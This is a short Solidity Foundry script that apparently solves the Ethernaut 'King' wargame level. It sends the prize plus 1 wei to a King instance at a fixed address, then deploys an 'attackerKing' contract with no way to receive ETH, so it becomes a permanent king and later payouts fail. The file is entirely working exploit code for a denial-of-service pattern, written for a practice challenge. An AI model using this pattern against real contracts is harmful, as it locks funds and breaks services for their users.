//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {King} from "src/ethernaut9.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut9Script is Script{
    King instance = King(payable(0x537EE34119Ea56EE0e73D37D294D3aa786778F48));
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint256 amount = instance.prize() + 1 wei;

        (bool success,) =address(instance).call{value: amount}("");
        require(success,"failed low level call");


        console.log("king : ", instance._king());

        amount = instance.prize() + 1 wei;
        new attackerKing{value: amount}(address(instance),amount);
       
        console.log("king after attack : ", instance._king());

        vm.stopBroadcast();
    }
}
contract attackerKing{
    constructor (address _king,uint256 amount) payable{
        (bool success,) = payable(_king).call{value: amount}("");
        require(success,"failed low level call");
    }
}

